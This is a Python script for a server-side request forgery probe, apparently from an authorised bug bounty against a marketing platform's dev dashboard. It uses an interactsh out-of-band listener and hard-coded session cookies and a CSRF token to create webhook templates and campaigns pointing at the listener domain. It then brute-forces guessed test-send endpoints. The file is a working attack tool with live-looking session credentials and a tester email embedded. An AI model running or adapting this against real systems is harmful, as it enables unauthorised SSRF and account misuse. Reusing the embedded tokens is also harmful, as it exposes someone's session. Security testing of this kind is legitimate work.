#!/usr/bin/env python3
"""
SSRF Trigger Script — Phase 2
Extracts created template IDs and attempts to trigger webhook execution.
"""

import requests
import json
import time
import re
import subprocess
import os
import threading
from datetime import datetime, timezone

TARGET_HOST = "https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com"
APP_GROUP_ID = "69c8d257629242005dba8746"

COOKIES = {
    "i18next": "en",
    "sign_in_email": "venu17+3ytlztjh@wearehackerone.com",
    "remember_login_enc_v1": "%242%24qeOuf%2FXAUHd7STxQVIseIA%3D%3D%24J7OQ50Vxcnw3bFe5iiiLAHnfOdDCywaCG%2BWxIz%2Bu9BLzaIkUZBhuPo8GIM7Y%0ABgF3",
    "_session_id": "8487d00ec75f2d3dafdbf6ad26ae209d",
    "ag_id___69c8d257629242005dba86a5": "69c8d257629242005dba8746",
    "f_ag_id___69c8d257629242005dba86a5": "69c8d257629242005dba8746",
    "ab.storage.userId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A69c8d258629242005dba8850%7Ce%3Aundefined%7Cc%3A1774770408961%7Cl%3A1774770408964",
    "ab.storage.deviceId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A65332216-407e-4d43-b650-d7df59a26106%7Ce%3Aundefined%7Cc%3A1774770408966%7Cl%3A1774770408966",
    "ab.storage.sessionId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A9f03484b-7b11-40d1-823f-e1449eb62cc8%7Ce%3A1774771186307%7Cc%3A1774770408963%7Cl%3A1774770886307",
}

interactions_detected = []


def log(msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def get_csrf():
    resp = requests.get(
        f"{TARGET_HOST}/engagement/templates_and_media/webhook_templates/{APP_GROUP_ID}/new",
        cookies=COOKIES,
        headers={"User-Agent": "Mozilla/5.0"},
        allow_redirects=True,
        timeout=10,
    )
    match = re.search(r'name="csrf-token"\s+content="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    match = re.search(r'csrf-token.*?content="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None


def make_headers(csrf_token):
    return {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "X-Csrf-Token": csrf_token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": TARGET_HOST,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }


def start_interactsh():
    gopath = subprocess.check_output(["go", "env", "GOPATH"]).decode().strip()
    client_bin = os.path.join(gopath, "bin", "interactsh-client")
    proc = subprocess.Popen(
        [client_bin, "-v", "-poll-interval", "3", "-json"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    domain = None
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stderr.readline()
        if not line:
            time.sleep(0.2)
            continue
        match = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
        if match:
            domain = match.group(1)
            break
    return proc, domain


def collect_interactions(proc, duration=45):
    global interactions_detected
    deadline = time.time() + duration
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line.strip():
            try:
                data = json.loads(line.strip())
                interactions_detected.append(data)
                log(f"  *** OOB INTERACTION: {json.dumps(data, indent=2)[:500]}")
            except json.JSONDecodeError:
                if "oast" in line.lower() or "dns" in line.lower() or "http" in line.lower():
                    interactions_detected.append({"raw": line.strip()})
                    log(f"  *** OOB (raw): {line.strip()[:200]}")
        time.sleep(0.3)


def main():
    log("=" * 60)
    log("SSRF Trigger Script — Phase 2")
    log("=" * 60)

    log("\nStarting interactsh...")
    interactsh_proc, oob_domain = start_interactsh()
    log(f"OOB domain: {oob_domain}")

    log("\nGetting CSRF token...")
    csrf = get_csrf()
    log(f"CSRF: {csrf[:20] if csrf else 'FAILED'}...")
    headers = make_headers(csrf)

    # Start OOB listener in background
    collector = threading.Thread(target=collect_interactions, args=(interactsh_proc, 120))
    collector.daemon = True
    collector.start()

    # Phase 1: List all templates to find our created ones
    log("\n--- Phase 1: List existing webhook templates ---")
    resp = requests.get(
        f"{TARGET_HOST}/engagement/webhook_templates?app_group_id={APP_GROUP_ID}",
        headers=headers,
        cookies=COOKIES,
        timeout=10,
    )
    log(f"Template list response: {resp.status_code}")

    templates = []
    try:
        data = resp.json()
        log(f"Total templates: {data.get('hits', 'unknown')}")
        for t in data.get("results", []):
            tid = t.get("id", "")
            tname = t.get("name", "")
            turl = t.get("webhook_url", "")
            log(f"  Template: {tid} | {tname} | {turl[:60]}")
            templates.append({"id": tid, "name": tname, "webhook_url": turl})
    except Exception as e:
        log(f"Error parsing templates: {e}")
        log(f"Raw response: {resp.text[:500]}")

    # Phase 2: Create a fresh template with OOB URL and get its ID from response
    log("\n--- Phase 2: Create fresh template with OOB domain ---")
    oob_url = f"https://trigger-test.{oob_domain}" if oob_domain else "https://example.com"
    create_payload = {
        "name": f"ssrf-trigger-{int(time.time())}",
        "description": None,
        "tag_names": [],
        "webhook_body": "{}",
        "webhook_body_type": "json",
        "webhook_method": "POST",
        "territory_ids": [],
        "api_identifier": "",
        "webhook_url": oob_url,
        "webhook_headers": {},
    }
    resp = requests.post(
        f"{TARGET_HOST}/engagement/webhook_templates/undefined?app_group_id={APP_GROUP_ID}",
        headers=headers,
        cookies=COOKIES,
        json=create_payload,
        timeout=15,
    )
    log(f"Create response: {resp.status_code}")
    log(f"Create body: {resp.text[:500]}")

    new_template_id = None
    try:
        body = resp.json()
        template_data = body.get("template", {})
        new_template_id = template_data.get("id") or template_data.get("_id") or template_data.get("api_identifier")
        log(f"New template ID: {new_template_id}")
        log(f"Template data keys: {list(template_data.keys())}")
        log(f"Full template response: {json.dumps(template_data, indent=2)[:800]}")
    except Exception as e:
        log(f"Error parsing create response: {e}")

    # Phase 3: Try various trigger mechanisms on all templates
    log("\n--- Phase 3: Trigger webhook execution ---")

    all_template_ids = []
    if new_template_id:
        all_template_ids.append(new_template_id)
    for t in templates:
        if t["id"] not in all_template_ids:
            all_template_ids.append(t["id"])

    trigger_patterns = [
        ("POST", "/engagement/webhook_templates/{tid}/test?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/{tid}/test_send?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/{tid}/send_test?app_group_id={ag}"),
        ("GET", "/engagement/webhook_templates/{tid}/test?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/{tid}/preview?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/{tid}/execute?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/{tid}/fire?app_group_id={ag}"),
        ("POST", "/engagement/webhook_templates/test?app_group_id={ag}&template_id={tid}"),
        ("POST", "/engagement/webhook_templates/send_test?app_group_id={ag}&template_id={tid}"),
        ("POST", "/engagement/webhooks/test?app_group_id={ag}"),
        ("POST", "/engagement/webhooks/send_test?app_group_id={ag}"),
    ]

    for tid in all_template_ids[:3]:
        log(f"\n  Trying triggers for template: {tid}")
        for method, pattern in trigger_patterns:
            url = f"{TARGET_HOST}{pattern.format(tid=tid, ag=APP_GROUP_ID)}"
            try:
                if method == "POST":
                    resp = requests.post(url, headers=headers, cookies=COOKIES,
                                         json={"template_id": tid}, timeout=10, allow_redirects=False)
                else:
                    resp = requests.get(url, headers=headers, cookies=COOKIES,
                                        timeout=10, allow_redirects=False)
                status = resp.status_code
                body_preview = resp.text[:100].replace("\n", " ")
                if status not in (301, 302, 404):
                    log(f"    [{method}] {pattern}: {status} *** — {body_preview}")
                else:
                    log(f"    [{method}] {pattern}: {status}")
            except Exception as e:
                log(f"    [{method}] {pattern}: ERROR — {e}")

    # Phase 4: Try creating a campaign with webhook channel
    log("\n--- Phase 4: Create webhook campaign to trigger send ---")
    campaign_url = f"https://campaign-trigger.{oob_domain}" if oob_domain else "https://example.com"

    campaign_headers = headers.copy()
    campaign_headers["Referer"] = f"{TARGET_HOST}/engagement/campaigns"

    # Try creating a campaign directly
    campaign_payload = {
        "name": f"ssrf-campaign-test-{int(time.time())}",
        "channel": "webhook",
        "webhook_url": campaign_url,
        "webhook_method": "GET",
        "webhook_body": "",
        "webhook_headers": {},
    }
    resp = requests.post(
        f"{TARGET_HOST}/engagement/campaigns?app_group_id={APP_GROUP_ID}",
        headers=campaign_headers,
        cookies=COOKIES,
        json=campaign_payload,
        timeout=15,
        allow_redirects=False,
    )
    log(f"Campaign create: {resp.status_code} — {resp.text[:200]}")

    # Phase 5: Try the webhook send test endpoint with inline webhook config
    log("\n--- Phase 5: Direct webhook test send ---")
    test_url = f"https://direct-send.{oob_domain}" if oob_domain else "https://example.com"

    direct_payloads = [
        {
            "endpoint": "/engagement/webhook/test_send",
            "body": {
                "webhook_url": test_url,
                "webhook_method": "GET",
                "webhook_body": "",
                "webhook_headers": {},
            },
        },
        {
            "endpoint": "/engagement/webhooks/test_send",
            "body": {
                "url": test_url,
                "method": "GET",
            },
        },
        {
            "endpoint": "/api/webhook/test",
            "body": {
                "webhook_url": test_url,
                "request_method": "GET",
            },
        },
        {
            "endpoint": "/engagement/test_webhook",
            "body": {
                "webhook_url": test_url,
                "webhook_method": "GET",
                "webhook_body": "",
                "webhook_headers": {},
                "app_group_id": APP_GROUP_ID,
            },
        },
        {
            "endpoint": f"/engagement/webhook_campaigns/test_send?app_group_id={APP_GROUP_ID}",
            "body": {
                "webhook_url": test_url,
                "webhook_method": "GET",
                "webhook_body": "",
                "webhook_headers": {},
            },
        },
    ]

    for dp in direct_payloads:
        try:
            resp = requests.post(
                f"{TARGET_HOST}{dp['endpoint']}",
                headers=headers,
                cookies=COOKIES,
                json=dp["body"],
                timeout=10,
                allow_redirects=False,
            )
            status = resp.status_code
            body_preview = resp.text[:150].replace("\n", " ")
            if status not in (301, 302):
                log(f"  [{dp['endpoint']}]: {status} *** — {body_preview}")
            else:
                log(f"  [{dp['endpoint']}]: {status} (redirect)")
        except Exception as e:
            log(f"  [{dp['endpoint']}]: ERROR — {e}")

    # Phase 6: Explore the campaign/canvas flow for sending
    log("\n--- Phase 6: Explore additional webhook send endpoints ---")
    explore_endpoints = [
        f"/engagement/campaigns/test_send?app_group_id={APP_GROUP_ID}",
        f"/engagement/campaigns/webhook/test?app_group_id={APP_GROUP_ID}",
        f"/messaging/webhook/test?app_group_id={APP_GROUP_ID}",
        f"/messaging/send?app_group_id={APP_GROUP_ID}",
    ]

    for ep in explore_endpoints:
        for method in ["GET", "POST"]:
            try:
                if method == "POST":
                    resp = requests.post(
                        f"{TARGET_HOST}{ep}", headers=headers, cookies=COOKIES,
                        json={"webhook_url": test_url}, timeout=10, allow_redirects=False)
                else:
                    resp = requests.get(
                        f"{TARGET_HOST}{ep}", headers=headers, cookies=COOKIES,
                        timeout=10, allow_redirects=False)
                if resp.status_code not in (301, 302):
                    log(f"  [{method}] {ep}: {resp.status_code} *** — {resp.text[:100]}")
                else:
                    log(f"  [{method}] {ep}: {resp.status_code}")
            except Exception as e:
                log(f"  [{method}] {ep}: ERROR — {e}")

    # Phase 7: Wait for OOB interactions
    log("\n--- Phase 7: Final OOB collection (30s) ---")
    time.sleep(30)

    log(f"\n{'='*60}")
    log(f"TOTAL OOB INTERACTIONS: {len(interactions_detected)}")
    if interactions_detected:
        for i, interaction in enumerate(interactions_detected, 1):
            log(f"\nInteraction {i}:")
            log(json.dumps(interaction, indent=2)[:1000])
    log(f"{'='*60}")

    # Save results
    with open("/workspace/ssrf_trigger_results.json", "w") as f:
        json.dump({
            "oob_domain": oob_domain,
            "interactions": interactions_detected,
            "templates_found": templates,
            "new_template_id": new_template_id,
        }, f, indent=2)

    if interactsh_proc:
        interactsh_proc.terminate()


if __name__ == "__main__":
    main()
